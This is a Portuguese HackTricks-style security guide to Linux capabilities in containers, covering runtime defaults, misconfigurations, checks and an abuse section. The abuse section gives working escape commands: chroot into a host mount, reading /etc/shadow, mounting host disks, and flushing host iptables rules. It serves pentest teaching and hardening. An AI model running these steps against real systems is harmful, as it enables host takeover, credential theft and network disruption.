# Capacidades do Linux em Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

As capacidades do Linux são uma das peças mais importantes da segurança de containers porque respondem a uma questão sutil mas fundamental: **o que "root" realmente significa dentro de um container?** Em um sistema Linux normal, historicamente o UID 0 implicava um conjunto de privilégios muito amplo. Em kernels modernos, esse privilégio é decomposto em unidades menores chamadas capabilities. Um processo pode rodar como root e ainda assim não ter muitas operações poderosas se as capabilities relevantes tiverem sido removidas.

Containers dependem fortemente dessa distinção. Muitas cargas de trabalho ainda são iniciadas como UID 0 dentro do container por motivos de compatibilidade ou simplicidade. Sem o drop de capabilities, isso seria extremamente perigoso. Com o drop de capabilities, um processo root em container ainda consegue realizar muitas tarefas comuns dentro do container enquanto é negado de operações de kernel mais sensíveis. Por isso um shell de container que mostra `uid=0(root)` não significa automaticamente "host root" nem sequer "amplo privilégio de kernel". Os conjuntos de capabilities decidem quanto esse identidade root realmente vale.

Para a referência completa de Linux capabilities e muitos exemplos de abuso, veja:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operação

Capabilities são rastreadas em vários conjuntos, incluindo permitted, effective, inheritable, ambient, and bounding sets. Para muitas avaliações de container, a semântica exata do kernel de cada conjunto é menos imediatamente importante do que a pergunta prática final: **quais operações privilegiadas este processo pode realizar com sucesso agora, e quais ganhos de privilégio futuros ainda são possíveis?**

A razão pela qual isso importa é que muitas técnicas de escape são na verdade problemas de capabilities disfarçados de problemas de container. Uma carga de trabalho com `CAP_SYS_ADMIN` pode alcançar uma enorme quantidade de funcionalidades do kernel que um processo root de container normalmente não deveria tocar. Uma carga de trabalho com `CAP_NET_ADMIN` se torna muito mais perigosa se também compartilhar o namespace de rede do host. Uma carga de trabalho com `CAP_SYS_PTRACE` fica muito mais interessante se puder ver processos do host através do compartilhamento de PID do host. No Docker ou Podman isso pode aparecer como `--pid=host`; no Kubernetes geralmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele deve ser lido em conjunto com namespaces, seccomp, e política MAC.

## Laboratório

Uma maneira muito direta de inspecionar capabilities dentro de um container é:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Você também pode comparar um contêiner mais restrito com outro que tem todas as capabilities adicionadas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver o efeito de uma adição mais restrita, tente remover tudo e adicionar de volta apenas uma capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Esses pequenos experimentos ajudam a mostrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície real de privilégios disponível para o processo.

## Capacidades de Alto Risco

Embora muitas capabilities possam importar dependendo do alvo, algumas são repetidamente relevantes na análise de container escape.

**`CAP_SYS_ADMIN`** é aquela que os defensores devem tratar com mais suspeita. Frequentemente é descrita como "the new root" porque desbloqueia uma quantidade enorme de funcionalidades, incluindo operações relacionadas a mount, comportamento sensível a namespace, e muitos caminhos do kernel que nunca deveriam ser expostos casualmente para containers. Se um container tem `CAP_SYS_ADMIN`, seccomp fraco, e nenhuma contenção MAC forte, muitos vetores clássicos de escape se tornam muito mais realistas.

**`CAP_SYS_PTRACE`** importa quando existe visibilidade de processos, especialmente se o PID namespace é compartilhado com o host ou com workloads vizinhos interessantes. Pode transformar visibilidade em tampamento.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** importam em ambientes focados em rede. Em uma bridge network isolada elas já podem ser arriscadas; em um host network namespace compartilhado elas são muito piores porque o workload pode reconfigurar a rede do host, sniff, spoof, ou interferir nos fluxos de tráfego locais.

**`CAP_SYS_MODULE`** costuma ser catastrófica em um ambiente com root porque carregar módulos do kernel é efetivamente controle do kernel do host. Quase nunca deveria aparecer em um workload de container de uso geral.

## Uso em Runtime

Docker, Podman, stacks baseados em containerd, e CRI-O todos usam controles de capabilities, mas os defaults e as interfaces de gerenciamento diferem. Docker os expõe diretamente por meio de flags como `--cap-drop` e `--cap-add`. Podman expõe controles similares e frequentemente se beneficia da execução rootless como uma camada adicional de segurança. Kubernetes apresenta adições e remoções de capabilities através do `securityContext` do Pod ou do container. Ambientes de system-container como LXC/Incus também dependem do controle de capabilities, mas a integração mais ampla com o host desses sistemas frequentemente tenta operadores a relaxar defaults mais agressivamente do que fariam em um ambiente de app-container.

O mesmo princípio vale para todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma que deveria ser concedida. Muitos incidentes do mundo real começam quando um operador adiciona uma capability simplesmente porque um workload falhou sob uma configuração mais restrita e a equipe precisava de um conserto rápido.

## Misconfigurações

O erro mais óbvio é **`--cap-add=ALL`** em CLIs estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar" sem também entender as implicações de namespace, seccomp e mounts. Outro modo comum de falha é combinar capabilities extras com compartilhamento de namespace do host. No Docker ou Podman isso pode aparecer como `--pid=host`, `--network=host`, ou `--userns=host`; no Kubernetes a exposição equivalente normalmente aparece através de configurações do workload como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera o que a capability realmente pode afetar.

Também é comum ver administradores acreditarem que, porque um workload não é totalmente `--privileged`, ele ainda está significativamente contido. Às vezes isso é verdade, mas às vezes a postura efetiva já está suficientemente próxima de privileged que a distinção deixa de importar operacionalmente.

## Abuso

O primeiro passo prático é enumerar o conjunto efetivo de capabilities e imediatamente testar as ações específicas de cada capability que importariam para escape ou acesso a informações do host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` estiver presente, teste primeiro mount-based abuse e acesso ao sistema de arquivos do host, porque este é um dos meios mais comuns que permitem breakout:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` estiver presente e o container puder ver processos interessantes, verifique se a capability pode ser transformada em inspeção de processos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiver presente, teste se a carga de trabalho pode manipular a pilha de rede visível ou, pelo menos, coletar inteligência de rede útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando um teste de capability tem sucesso, combine-o com a situação dos namespaces. Uma capability que parece meramente arriscada em um namespace isolado pode se tornar imediatamente um escape ou host-recon primitive quando o container também compartilha host PID, host network, ou host mounts.

### Exemplo Completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se o container tem `CAP_SYS_ADMIN` e um bind mount gravável do host filesystem como `/host`, o caminho de escape costuma ser direto:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se o `chroot` for bem-sucedido, os comandos agora serão executados no contexto do sistema de arquivos raiz do host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` não estiver disponível, o mesmo resultado pode muitas vezes ser alcançado chamando o binary através da árvore montada:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemplo completo: `CAP_SYS_ADMIN` + Acesso a dispositivo

Se um dispositivo de bloco do host estiver exposto, `CAP_SYS_ADMIN` pode transformá-lo em acesso direto ao sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Full Example: `CAP_NET_ADMIN` + Host Networking

Esta combinação nem sempre produz root do host diretamente, mas pode reconfigurar completamente a pilha de rede do host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso pode permitir denial of service, interceptação de tráfego ou acesso a serviços que antes eram filtrados.

## Verificações

O objetivo das verificações de capabilities não é apenas exibir valores brutos, mas entender se o processo tem privilégios suficientes para tornar perigosa sua situação atual de namespace e mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
O que é interessante aqui:

- `capsh --print` é a maneira mais fácil de identificar capabilities de alto risco como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` indica o que está efetivamente ativo agora, não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capabilities torna-se muito mais importante se o container também compartilha namespaces de PID, de network ou de user com o host, ou possui montagens do host graváveis.

Após coletar a informação bruta de capabilities, o próximo passo é a interpretação. Pergunte se o processo é root, se user namespaces estão ativos, se namespaces do host são compartilhados, se seccomp está em enforcing, e se AppArmor ou SELinux ainda restringem o processo. Um capability set por si só é apenas parte da história, mas frequentemente é a parte que explica por que uma container breakout funciona e outra falha com o mesmo ponto de partida aparente.

## Runtime Defaults

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto reduzido de capabilities por padrão | Docker mantém uma allowlist padrão de capabilities e remove as demais | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto reduzido de capabilities por padrão | Contêineres Podman são não privilegiados por padrão e usam um modelo de capabilities reduzido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herda os padrões do runtime a menos que alterado | Se nenhum `securityContext.capabilities` for especificado, o container recebe o conjunto padrão de capabilities do runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Normalmente padrão do runtime | O conjunto efetivo depende do runtime mais o Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Para Kubernetes, o ponto importante é que a API não define um conjunto universal padrão de capabilities. Se o Pod não adicionar nem remover capabilities, a carga de trabalho herda o padrão do runtime daquele nó.
